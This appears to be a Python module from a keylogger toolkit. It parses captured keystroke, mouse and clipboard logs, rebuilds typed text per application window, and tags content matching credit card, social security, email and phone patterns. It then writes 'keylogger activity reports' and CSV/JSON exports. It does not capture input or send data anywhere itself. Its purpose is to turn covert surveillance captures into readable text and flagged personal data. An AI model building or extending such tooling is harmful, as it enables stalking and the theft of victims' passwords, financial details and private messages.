"""Enhanced log parser for processing keylogger data with advanced features."""

import json
import csv
import re
import time
import logging
from typing import Dict, List, Any, Optional, Tuple, Set
from datetime import datetime, timedelta
from collections import defaultdict, Counter
from dataclasses import dataclass
import hashlib

logger = logging.getLogger(__name__)


@dataclass
class ParsedEvent:
    """Represents a parsed log event."""
    timestamp: float
    event_type: str
    content: str
    window_name: str
    metadata: Dict[str, Any]
    processed_content: Optional[str] = None
    tags: List[str] = None
    
    def __post_init__(self):
        if self.tags is None:
            self.tags = []


class LogParser:
    """Enhanced log parser with advanced analysis capabilities."""
    
    def __init__(self, config_manager=None):
        self.config = config_manager
        
        # Parser settings
        self.enable_content_analysis = self._get_config('parser.enable_content_analysis', True)
        self.enable_pattern_detection = self._get_config('parser.enable_pattern_detection', True)
        self.enable_statistics = self._get_config('parser.enable_statistics', True)
        self.privacy_mode = self._get_config('parser.privacy_mode', False)
        
        # Content filters
        self.min_word_length = self._get_config('parser.min_word_length', 2)
        self.max_content_length = self._get_config('parser.max_content_length', 1000)
        self.filter_special_chars = self._get_config('parser.filter_special_chars', True)
        
        # Pattern detection
        self.patterns = {
            'email': re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'),
            'url': re.compile(r'https?://(?:[-\w.])+(?:[:\d]+)?(?:/(?:[\w/_.])*(?:\?(?:[\w&=%.])*)?(?:#(?:\w*))?)?'),
            'phone': re.compile(r'\b(?:\+?1[-.]?)?\(?([0-9]{3})\)?[-.]?([0-9]{3})[-.]?([0-9]{4})\b'),
            'credit_card': re.compile(r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3[0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})\b'),
            'ssn': re.compile(r'\b(?!000)(?!666)(?!9)\d{3}[-.]?(?!00)\d{2}[-.]?(?!0000)\d{4}\b'),
            'ip_address': re.compile(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'),
            'file_path': re.compile(r'[A-Za-z]:\\(?:[^\\/:*?"<>|\r\n]+\\)*[^\\/:*?"<>|\r\n]*'),
            'time': re.compile(r'\b(?:[01]?[0-9]|2[0-3]):[0-5][0-9](?::[0-5][0-9])?\b'),
            'date': re.compile(r'\b(?:0?[1-9]|1[0-2])[/-](?:0?[1-9]|[12][0-9]|3[01])[/-](?:19|20)?\d{2}\b')
        }
        
        # Statistics tracking
        self.stats = {
            'total_events': 0,
            'events_by_type': defaultdict(int),
            'events_by_window': defaultdict(int),
            'total_characters': 0,
            'total_words': 0,
            'patterns_detected': defaultdict(int),
            'processing_errors': 0,
            'parsing_start_time': time.time()
        }
        
        # Content analysis
        self.word_frequency = Counter()
        self.window_activity = defaultdict(lambda: {'time_spent': 0, 'events': 0, 'last_activity': 0})
        self.hourly_activity = defaultdict(int)
        
        # Current state
        self.current_text_buffer = ""
        self.current_window = "Unknown"
        self.last_event_time = 0
        self.session_start_time = time.time()
    
    def _get_config(self, key: str, default: Any) -> Any:
        """Get configuration value with fallback to default."""
        if self.config:
            return self.config.get(key, default)
        return default
    
    def parse_log_file(self, file_path: str) -> List[ParsedEvent]:
        """Parse a log file and return structured events."""
        try:
            logger.info(f"Starting to parse log file: {file_path}")
            events = []
            
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
                for line_num, line in enumerate(file, 1):
                    try:
                        line = line.strip()
                        if not line:
                            continue
                        
                        event = self._parse_log_line(line)
                        if event:
                            events.append(event)
                            self._update_statistics(event)
                    
                    except Exception as e:
                        logger.error(f"Error parsing line {line_num}: {e}")
                        self.stats['processing_errors'] += 1
                        continue
            
            logger.info(f"Parsed {len(events)} events from {file_path}")
            return events
            
        except Exception as e:
            logger.error(f"Error parsing log file {file_path}: {e}")
            return []
    
    def _parse_log_line(self, line: str) -> Optional[ParsedEvent]:
        """Parse a single log line into a structured event."""
        try:
            # Try to parse as JSON first (new format)
            if line.startswith('{'):
                return self._parse_json_line(line)
            
            # Fall back to legacy format parsing
            return self._parse_legacy_line(line)
            
        except Exception as e:
            logger.debug(f"Error parsing line: {e}")
            return None
    
    def _parse_json_line(self, line: str) -> Optional[ParsedEvent]:
        """Parse JSON format log line."""
        try:
            data = json.loads(line)
            
            event = ParsedEvent(
                timestamp=data.get('timestamp', time.time()),
                event_type=data.get('event_type', 'Unknown'),
                content=data.get('content', ''),
                window_name=data.get('window_name', 'Unknown'),
                metadata=data.get('metadata', {})
            )
            
            # Process the content
            if self.enable_content_analysis:
                event.processed_content = self._process_content(event.content, event.event_type)
                event.tags = self._detect_content_tags(event.content)
            
            return event
            
        except json.JSONDecodeError as e:
            logger.debug(f"JSON parsing error: {e}")
            return None
    
    def _parse_legacy_line(self, line: str) -> Optional[ParsedEvent]:
        """Parse legacy format log line."""
        try:
            # Legacy format: [timestamp] event_type: content (window: window_name)
            # Example: [2024-01-01 12:00:00] Key Press: hello world (window: Notepad)
            
            # Extract timestamp
            timestamp_match = re.match(r'\[(.*?)\]', line)
            if not timestamp_match:
                return None
            
            timestamp_str = timestamp_match.group(1)
            try:
                timestamp = datetime.strptime(timestamp_str, '%Y-%m-%d %H:%M:%S').timestamp()
            except ValueError:
                timestamp = time.time()
            
            # Extract event type and content
            remaining = line[timestamp_match.end():].strip()
            
            # Look for window information
            window_match = re.search(r'\(window: (.+?)\)$', remaining)
            if window_match:
                window_name = window_match.group(1)
                remaining = remaining[:window_match.start()].strip()
            else:
                window_name = 'Unknown'
            
            # Split event type and content
            if ':' in remaining:
                event_type, content = remaining.split(':', 1)
                event_type = event_type.strip()
                content = content.strip()
            else:
                event_type = 'Unknown'
                content = remaining
            
            event = ParsedEvent(
                timestamp=timestamp,
                event_type=event_type,
                content=content,
                window_name=window_name,
                metadata={}
            )
            
            # Process the content
            if self.enable_content_analysis:
                event.processed_content = self._process_content(event.content, event.event_type)
                event.tags = self._detect_content_tags(event.content)
            
            return event
            
        except Exception as e:
            logger.debug(f"Legacy parsing error: {e}")
            return None
    
    def _process_content(self, content: str, event_type: str) -> str:
        """Process and clean content based on event type."""
        try:
            if not content:
                return content
            
            processed = content
            
            # Apply privacy filters
            if self.privacy_mode:
                processed = self._apply_privacy_filters(processed)
            
            # Event-specific processing
            if event_type == 'Key Press':
                processed = self._process_keyboard_content(processed)
            elif event_type == 'Mouse Click':
                processed = self._process_mouse_content(processed)
            elif event_type == 'Clipboard':
                processed = self._process_clipboard_content(processed)
            
            # General content cleaning
            if self.filter_special_chars:
                processed = self._clean_special_characters(processed)
            
            # Limit content length
            if len(processed) > self.max_content_length:
                processed = processed[:self.max_content_length] + '...'
            
            return processed
            
        except Exception as e:
            logger.error(f"Error processing content: {e}")
            return content
    
    def _apply_privacy_filters(self, content: str) -> str:
        """Apply privacy filters to content."""
        try:
            # Hash sensitive patterns
            for pattern_name, pattern in self.patterns.items():
                if pattern_name in ['email', 'phone', 'credit_card', 'ssn']:
                    matches = pattern.findall(content)
                    for match in matches:
                        if isinstance(match, tuple):
                            match = ''.join(match)
                        hashed = hashlib.sha256(match.encode()).hexdigest()[:8]
                        content = content.replace(match, f'[{pattern_name.upper()}_{hashed}]')
            
            return content
            
        except Exception as e:
            logger.error(f"Error applying privacy filters: {e}")
            return content
    
    def _process_keyboard_content(self, content: str) -> str:
        """Process keyboard input content."""
        try:
            # Handle special keys
            special_keys = {
                '<backspace>': '⌫',
                '<enter>': '↵',
                '<tab>': '⇥',
                '<space>': ' ',
                '<shift>': '⇧',
                '<ctrl>': '⌃',
                '<alt>': '⌥',
                '<delete>': '⌦'
            }
            
            processed = content
            for key, symbol in special_keys.items():
                processed = processed.replace(key, symbol)
            
            return processed
            
        except Exception:
            return content
    
    def _process_mouse_content(self, content: str) -> str:
        """Process mouse event content."""
        try:
            # Extract coordinates and format them
            coord_match = re.search(r'\((\d+), (\d+)\)', content)
            if coord_match:
                x, y = coord_match.groups()
                return f"Click at ({x}, {y})"
            
            return content
            
        except Exception:
            return content
    
    def _process_clipboard_content(self, content: str) -> str:
        """Process clipboard content."""
        try:
            # Truncate long clipboard content
            if len(content) > 100:
                return content[:100] + f'... ({len(content)} chars total)'
            
            return content
            
        except Exception:
            return content
    
    def _clean_special_characters(self, content: str) -> str:
        """Clean special characters from content."""
        try:
            # Remove or replace problematic characters
            cleaned = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\x9f]', '', content)
            cleaned = re.sub(r'\s+', ' ', cleaned)  # Normalize whitespace
            return cleaned.strip()
            
        except Exception:
            return content
    
    def _detect_content_tags(self, content: str) -> List[str]:
        """Detect tags based on content patterns."""
        tags = []
        
        try:
            if not self.enable_pattern_detection:
                return tags
            
            # Detect patterns
            for pattern_name, pattern in self.patterns.items():
                if pattern.search(content):
                    tags.append(pattern_name)
                    self.stats['patterns_detected'][pattern_name] += 1
            
            # Content-based tags
            if len(content) > 50:
                tags.append('long_content')
            
            if content.isupper() and len(content) > 5:
                tags.append('caps_lock')
            
            if any(char.isdigit() for char in content) and len(content) > 3:
                tags.append('contains_numbers')
            
            # Language detection (basic)
            if re.search(r'[а-яё]', content, re.IGNORECASE):
                tags.append('cyrillic')
            elif re.search(r'[一-龯]', content):
                tags.append('chinese')
            elif re.search(r'[ひらがなカタカナ]', content):
                tags.append('japanese')
            
            return tags
            
        except Exception as e:
            logger.error(f"Error detecting content tags: {e}")
            return tags
    
    def _update_statistics(self, event: ParsedEvent) -> None:
        """Update parsing statistics."""
        try:
            if not self.enable_statistics:
                return
            
            self.stats['total_events'] += 1
            self.stats['events_by_type'][event.event_type] += 1
            self.stats['events_by_window'][event.window_name] += 1
            
            # Content statistics
            if event.content:
                self.stats['total_characters'] += len(event.content)
                
                # Word counting
                words = re.findall(r'\b\w+\b', event.content.lower())
                words = [w for w in words if len(w) >= self.min_word_length]
                self.stats['total_words'] += len(words)
                self.word_frequency.update(words)
            
            # Window activity tracking
            window_stats = self.window_activity[event.window_name]
            window_stats['events'] += 1
            window_stats['last_activity'] = event.timestamp
            
            # Time-based activity
            hour = datetime.fromtimestamp(event.timestamp).hour
            self.hourly_activity[hour] += 1
            
            # Update current state
            self.last_event_time = event.timestamp
            if event.window_name != 'Unknown':
                self.current_window = event.window_name
            
        except Exception as e:
            logger.error(f"Error updating statistics: {e}")
    
    def generate_readable_report(self, events: List[ParsedEvent], output_file: str = None) -> str:
        """Generate a human-readable report from parsed events."""
        try:
            report_lines = []
            report_lines.append("=" * 80)
            report_lines.append("KEYLOGGER ACTIVITY REPORT")
            report_lines.append("=" * 80)
            report_lines.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            report_lines.append(f"Total Events: {len(events)}")
            report_lines.append("")
            
            # Group events by time periods
            events_by_day = defaultdict(list)
            for event in events:
                day = datetime.fromtimestamp(event.timestamp).strftime('%Y-%m-%d')
                events_by_day[day].append(event)
            
            # Generate daily reports
            for day in sorted(events_by_day.keys()):
                day_events = events_by_day[day]
                report_lines.append(f"\n{'='*20} {day} {'='*20}")
                report_lines.append(f"Events: {len(day_events)}")
                report_lines.append("")
                
                # Group by window
                events_by_window = defaultdict(list)
                for event in day_events:
                    events_by_window[event.window_name].append(event)
                
                for window in sorted(events_by_window.keys()):
                    window_events = events_by_window[window]
                    report_lines.append(f"\n--- {window} ---")
                    
                    # Reconstruct text for keyboard events
                    text_content = self._reconstruct_text(window_events)
                    if text_content:
                        report_lines.append(f"Text: {text_content}")
                    
                    # Show other events
                    non_text_events = [e for e in window_events if e.event_type != 'Key Press']
                    for event in non_text_events[:10]:  # Limit to first 10
                        time_str = datetime.fromtimestamp(event.timestamp).strftime('%H:%M:%S')
                        report_lines.append(f"[{time_str}] {event.event_type}: {event.content}")
                    
                    if len(non_text_events) > 10:
                        report_lines.append(f"... and {len(non_text_events) - 10} more events")
            
            # Add statistics
            report_lines.extend(self._generate_statistics_report())
            
            report_content = "\n".join(report_lines)
            
            # Save to file if specified
            if output_file:
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(report_content)
                logger.info(f"Report saved to {output_file}")
            
            return report_content
            
        except Exception as e:
            logger.error(f"Error generating readable report: {e}")
            return f"Error generating report: {e}"
    
    def _reconstruct_text(self, events: List[ParsedEvent]) -> str:
        """Reconstruct typed text from keyboard events."""
        try:
            text_parts = []
            current_text = ""
            
            for event in events:
                if event.event_type == 'Key Press':
                    content = event.processed_content or event.content
                    
                    if content == '⌫':  # Backspace
                        if current_text:
                            current_text = current_text[:-1]
                    elif content == '↵':  # Enter
                        if current_text.strip():
                            text_parts.append(current_text.strip())
                        current_text = ""
                    elif content == '⇥':  # Tab
                        current_text += "\t"
                    elif len(content) == 1:  # Regular character
                        current_text += content
            
            # Add remaining text
            if current_text.strip():
                text_parts.append(current_text.strip())
            
            # Join and clean up
            result = " ".join(text_parts)
            result = re.sub(r'\s+', ' ', result)  # Normalize whitespace
            
            return result[:500] + ('...' if len(result) > 500 else '')
            
        except Exception as e:
            logger.error(f"Error reconstructing text: {e}")
            return ""
    
    def _generate_statistics_report(self) -> List[str]:
        """Generate statistics section of the report."""
        lines = []
        
        try:
            lines.append("\n" + "="*80)
            lines.append("STATISTICS")
            lines.append("="*80)
            
            # Basic stats
            lines.append(f"Total Events: {self.stats['total_events']}")
            lines.append(f"Total Characters: {self.stats['total_characters']}")
            lines.append(f"Total Words: {self.stats['total_words']}")
            lines.append(f"Processing Errors: {self.stats['processing_errors']}")
            
            # Events by type
            lines.append("\nEvents by Type:")
            for event_type, count in sorted(self.stats['events_by_type'].items(), key=lambda x: x[1], reverse=True):
                lines.append(f"  {event_type}: {count}")
            
            # Top windows
            lines.append("\nTop Active Windows:")
            top_windows = sorted(self.stats['events_by_window'].items(), key=lambda x: x[1], reverse=True)[:10]
            for window, count in top_windows:
                lines.append(f"  {window}: {count} events")
            
            # Patterns detected
            if self.stats['patterns_detected']:
                lines.append("\nPatterns Detected:")
                for pattern, count in sorted(self.stats['patterns_detected'].items(), key=lambda x: x[1], reverse=True):
                    lines.append(f"  {pattern}: {count}")
            
            # Top words
            if self.word_frequency:
                lines.append("\nMost Common Words:")
                for word, count in self.word_frequency.most_common(20):
                    lines.append(f"  {word}: {count}")
            
            # Hourly activity
            lines.append("\nActivity by Hour:")
            for hour in range(24):
                count = self.hourly_activity[hour]
                if count > 0:
                    bar = "█" * min(50, count // max(1, max(self.hourly_activity.values()) // 50))
                    lines.append(f"  {hour:02d}:00 {bar} ({count})")
            
        except Exception as e:
            logger.error(f"Error generating statistics report: {e}")
            lines.append(f"Error generating statistics: {e}")
        
        return lines
    
    def export_to_csv(self, events: List[ParsedEvent], output_file: str) -> None:
        """Export events to CSV format."""
        try:
            with open(output_file, 'w', newline='', encoding='utf-8') as csvfile:
                fieldnames = ['timestamp', 'datetime', 'event_type', 'content', 'processed_content', 
                             'window_name', 'tags', 'metadata']
                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                
                writer.writeheader()
                for event in events:
                    writer.writerow({
                        'timestamp': event.timestamp,
                        'datetime': datetime.fromtimestamp(event.timestamp).strftime('%Y-%m-%d %H:%M:%S'),
                        'event_type': event.event_type,
                        'content': event.content,
                        'processed_content': event.processed_content or '',
                        'window_name': event.window_name,
                        'tags': ','.join(event.tags) if event.tags else '',
                        'metadata': json.dumps(event.metadata) if event.metadata else ''
                    })
            
            logger.info(f"Events exported to CSV: {output_file}")
            
        except Exception as e:
            logger.error(f"Error exporting to CSV: {e}")
    
    def export_to_json(self, events: List[ParsedEvent], output_file: str) -> None:
        """Export events to JSON format."""
        try:
            events_data = []
            for event in events:
                events_data.append({
                    'timestamp': event.timestamp,
                    'datetime': datetime.fromtimestamp(event.timestamp).isoformat(),
                    'event_type': event.event_type,
                    'content': event.content,
                    'processed_content': event.processed_content,
                    'window_name': event.window_name,
                    'tags': event.tags,
                    'metadata': event.metadata
                })
            
            export_data = {
                'events': events_data,
                'statistics': self.stats,
                'export_info': {
                    'export_time': datetime.now().isoformat(),
                    'total_events': len(events),
                    'parser_version': '2.0'
                }
            }
            
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(export_data, f, indent=2, ensure_ascii=False)
            
            logger.info(f"Events exported to JSON: {output_file}")
            
        except Exception as e:
            logger.error(f"Error exporting to JSON: {e}")
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get current parsing statistics."""
        return {
            **self.stats,
            'parsing_duration': time.time() - self.stats['parsing_start_time'],
            'top_words': dict(self.word_frequency.most_common(50)),
            'window_activity': dict(self.window_activity),
            'hourly_activity': dict(self.hourly_activity)
        }
    
    def reset_statistics(self) -> None:
        """Reset all statistics."""
        self.stats = {
            'total_events': 0,
            'events_by_type': defaultdict(int),
            'events_by_window': defaultdict(int),
            'total_characters': 0,
            'total_words': 0,
            'patterns_detected': defaultdict(int),
            'processing_errors': 0,
            'parsing_start_time': time.time()
        }
        
        self.word_frequency.clear()
        self.window_activity.clear()
        self.hourly_activity.clear()


def main():
    """Main function for standalone usage."""
    import argparse
    
    parser = argparse.ArgumentParser(description='Enhanced Keylogger Log Parser')
    parser.add_argument('input_file', help='Input log file to parse')
    parser.add_argument('-o', '--output', help='Output file for readable report')
    parser.add_argument('--csv', help='Export to CSV file')
    parser.add_argument('--json', help='Export to JSON file')
    parser.add_argument('--privacy', action='store_true', help='Enable privacy mode')
    parser.add_argument('--no-analysis', action='store_true', help='Disable content analysis')
    
    args = parser.parse_args()
    
    # Configure logging
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    
    # Create parser
    log_parser = LogParser()
    log_parser.privacy_mode = args.privacy
    log_parser.enable_content_analysis = not args.no_analysis
    
    # Parse the log file
    events = log_parser.parse_log_file(args.input_file)
    
    if not events:
        print("No events found or error parsing file.")
        return
    
    # Generate outputs
    if args.output or not any([args.csv, args.json]):
        output_file = args.output or 'readable_log_report.txt'
        report = log_parser.generate_readable_report(events, output_file)
        print(f"Readable report saved to: {output_file}")
    
    if args.csv:
        log_parser.export_to_csv(events, args.csv)
        print(f"CSV export saved to: {args.csv}")
    
    if args.json:
        log_parser.export_to_json(events, args.json)
        print(f"JSON export saved to: {args.json}")
    
    # Print statistics
    stats = log_parser.get_statistics()
    print(f"\nParsing completed:")
    print(f"  Total events: {stats['total_events']}")
    print(f"  Total characters: {stats['total_characters']}")
    print(f"  Total words: {stats['total_words']}")
    print(f"  Processing errors: {stats['processing_errors']}")
    print(f"  Parsing duration: {stats['parsing_duration']:.2f} seconds")


if __name__ == '__main__':
    main()